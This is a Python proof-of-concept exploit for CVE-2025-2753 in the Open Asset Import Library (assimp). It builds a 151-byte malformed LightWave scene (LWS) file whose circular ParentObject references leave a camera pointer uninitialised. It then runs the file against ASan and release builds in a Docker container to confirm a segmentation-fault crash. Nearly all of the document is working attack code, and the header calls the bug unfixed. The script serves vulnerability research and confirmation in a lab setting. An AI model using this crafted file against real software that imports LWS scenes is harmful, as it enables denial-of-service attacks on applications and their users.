#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Assimp LWS Importer Uninitialized Camera Pointer Array (DoS)
# CVE            : CVE-2025-2753
# Vendor         : assimp (Open Source)
# Product        : Open Asset Import Library (assimp)
# Affected       : v5.4.3 through v6.0.4 (0-day, unfixed)
# Type           : CWE-457 - Use of Uninitialized Variable
# CVSS           : 6.3 (MEDIUM)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-2753 — Vector 2: Camera Array Crash via Hand-Crafted LWS

Generates a minimal 151-byte LWS file that triggers the vulnerability through
the camera pointer array (mCameras) instead of lights, proving the bug affects
multiple code paths. Uses circular parent references to create unreachable nodes.

ATTACK CHAIN:
  1. Hand-crafted LWS file with circular ParentObject references
  2. Camera node attached to unreachable object subgraph
  3. num_camera=1 counted, but camera[0] slot never filled
  4. MakeLeftHandedProcess::ProcessCamera(NULL) → SEGV

PREREQUISITES:
  - Docker with cve-2025-2753-vulnerable container running
  - No external dependencies (stdlib only)

REFERENCES:
  - CVE-2025-2753
  - https://github.com/assimp/assimp/issues/6014
"""

import subprocess
import sys
import os
import tempfile


def craft_camera_lws():
    """
    Generate a minimal malformed LWS file that triggers CopyPtrArray<aiCamera> crash.

    LWS file format (old format, version < 4):
    - Line 1: "LWSC" magic
    - Line 2: Version number (1 = old format with auto-incrementing node IDs)
    - Subsequent lines: Keywords with arguments

    Node ID assignment (version < 4):
    - Objects: auto-increment from cur_object=0
    - Lights: auto-increment from cur_light=0
    - Cameras: auto-increment from cur_camera=0

    ParentObject encoding:
    - ParentObject <N> sets parent = N | (1<<28)
    - operator== checks: type==OBJECT(1) && (num & AI_LWS_MASK)==N
    - So ParentObject N matches the Object node with number=N
    """
    lines = [
        # Header
        "LWSC",                    # Magic identifier
        "1",                       # Version 1 (old format, auto-incrementing IDs)
        "",

        # Object A (number=0) - Root node, no parent
        # This is the ONLY root node (no ParentObject).
        # BuildGraph starts here and only traverses A's children.
        "AddNullObject root_node",
        "",

        # Object B (number=1) - Forms circular reference with C
        # ParentObject 2 → links B as child of Object with number=2 (Object C)
        "AddNullObject circular_node_b",
        "ParentObject 2",
        "",

        # Object C (number=2) - Forms circular reference with B
        # ParentObject 1 → links C as child of Object with number=1 (Object B)
        # After resolution: B.parent_resolved=C, C.parent_resolved=B
        # Both B and C are non-root. Neither is reachable from root A.
        "AddNullObject circular_node_c",
        "ParentObject 1",
        "",

        # Camera D (number=0) - The unreachable camera
        # ParentObject 1 → links D as child of Object B (number=1)
        # Since B is unreachable (circular reference), D is also unreachable.
        # num_camera++ executes (num_camera=1), but BuildGraph never visits D,
        # so camOut is never incremented and camera[0] stays uninitialized.
        "AddCamera",
        "ParentObject 1",
        "",
    ]

    return "\n".join(lines) + "\n"


def run_test(container_name, lws_data, test_name):
    """
    Copy the crafted LWS file into the container and run both ASan and release builds.
    """
    # Write LWS to temp file and copy into container
    with tempfile.NamedTemporaryFile(suffix=".lws", mode="w", delete=False) as f:
        f.write(lws_data)
        tmp_path = f.name

    try:
        # Copy into container
        container_path = "/opt/poc/camera_crash.lws"
        subprocess.run(
            ["docker", "cp", tmp_path, f"{container_name}:{container_path}"],
            capture_output=True, timeout=10, check=True
        )
    finally:
        os.unlink(tmp_path)

    results = {}

    # Test 1: ASan build
    print(f"  [{test_name}] Testing with ASan build...")
    cmd = [
        "docker", "exec", container_name, "bash", "-c",
        f"LD_LIBRARY_PATH=/opt/assimp/build-asan/bin "
        f"assimp-asan info {container_path} 2>&1; "
        f"echo EXIT_CODE=$?"
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        output = "TIMEOUT"

    results["asan_output"] = output

    # Check for camera-specific crash
    asan_crash = (
        "AddressSanitizer" in output and "SEGV" in output
    )
    camera_path = (
        "CopyPtrArray<aiCamera>" in output
        or "Copy(aiCamera" in output
        or "aiCamera" in output
    )
    light_path = "CopyPtrArray<aiLight>" in output or "Copy(aiLight" in output

    results["asan_crash"] = asan_crash
    results["camera_path"] = camera_path
    results["light_path"] = light_path

    if asan_crash:
        if camera_path:
            print(f"  [{test_name}] ASan: CRASH in CopyPtrArray<aiCamera> — CAMERA VECTOR CONFIRMED")
        elif light_path:
            print(f"  [{test_name}] ASan: CRASH in CopyPtrArray<aiLight> — crashed via light path instead")
        else:
            print(f"  [{test_name}] ASan: CRASH detected (uninitialized pointer dereference)")
    else:
        # Check for non-zero exit
        if "EXIT_CODE=139" in output or "EXIT_CODE=134" in output or "EXIT_CODE=1" in output:
            print(f"  [{test_name}] ASan: Process crashed (non-zero exit)")
            results["asan_crash"] = True
        elif "EXIT_CODE=0" in output:
            print(f"  [{test_name}] ASan: No crash (exit 0)")
        else:
            print(f"  [{test_name}] ASan: Unexpected output")

    # Test 2: Release build
    print(f"  [{test_name}] Testing with release build...")
    cmd = [
        "docker", "exec", container_name, "bash", "-c",
        f"LD_LIBRARY_PATH=/opt/assimp/build-release/bin "
        f"assimp-release info {container_path} 2>&1; "
        f"echo EXIT_CODE=$?"
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        output = "TIMEOUT"

    results["release_output"] = output
    results["release_crash"] = (
        "EXIT_CODE=139" in output    # SIGSEGV
        or "EXIT_CODE=134" in output  # SIGABRT
        or "EXIT_CODE=1" in output    # ASan abort
        or "Segmentation fault" in output
    )

    if results["release_crash"]:
        print(f"  [{test_name}] Release: CRASH detected")
    else:
        print(f"  [{test_name}] Release: No crash")

    return results


def exploit(container_name):
    """Main exploit function."""
    print()
    print("CVE-2025-2753 Vector 2 — Uninitialized Camera Pointer Array")
    print("Technique: Circular Object Reference → Unreachable Camera Node")
    print(f"Target container: {container_name}")
    print()

    # Check container is running
    result = subprocess.run(
        ["docker", "inspect", "-f", "{{.State.Running}}", container_name],
        capture_output=True, text=True, timeout=10
    )
    if result.stdout.strip() != "true":
        print(f"[!] Container '{container_name}' is not running")
        return False

    # Generate the crafted LWS file
    print("[*] Generating hand-crafted LWS file targeting camera array...")
    lws_data = craft_camera_lws()
    print(f"    File size: {len(lws_data)} bytes")
    print(f"    Structure:")
    print(f"      - 3 AddNullObject nodes (Object 0=root, 1=circular_b, 2=circular_c)")
    print(f"      - 1 AddCamera node (Camera 0, parent=Object 1)")
    print(f"      - Circular reference: Object 1 ↔ Object 2")
    print(f"      - Camera 0 is child of Object 1 (unreachable)")
    print()

    # Show the crafted file content
    print("[*] Crafted LWS file content:")
    print("--- begin camera_crash.lws ---")
    for i, line in enumerate(lws_data.split('\n')):
        if line.strip():
            print(f"    {line}")
    print("--- end camera_crash.lws ---")
    print()

    # Run tests
    print("[*] Running tests against vulnerable container...")
    results = run_test(container_name, lws_data, "Camera")

    # Summary
    print()
    print("=" * 70)
    print("VECTOR 2 SUMMARY")
    print("=" * 70)

    confirmed = results["asan_crash"] or results["release_crash"]

    if confirmed:
        if results.get("camera_path"):
            print("[+] CVE-2025-2753 CONFIRMED via CAMERA vector")
            print("    Crash in CopyPtrArray<aiCamera> — same root cause, different type")
        else:
            print("[+] CVE-2025-2753 CONFIRMED — crash triggered by crafted LWS file")

        print()
        print("    This proves the vulnerability exists in BOTH light AND camera")
        print("    array paths, and can be triggered with a clean, hand-crafted file")
        print("    (no binary garbage needed — just malformed parent references).")
    else:
        print("[-] Camera vector did not trigger a crash")
        print("    The circular reference technique may not create unreachable nodes")
        print("    in this specific code path. See output above for details.")

    # Print detailed output for debugging
    print()
    print("[*] Detailed ASan output:")
    print(results["asan_output"][:3000])
    print()
    print("[*] Detailed release output:")
    print(results["release_output"][:1000])

    return confirmed


if __name__ == "__main__":
    container = sys.argv[1] if len(sys.argv) > 1 else "cve-2025-2753-vulnerable"
    success = exploit(container)
    sys.exit(0 if success else 1)
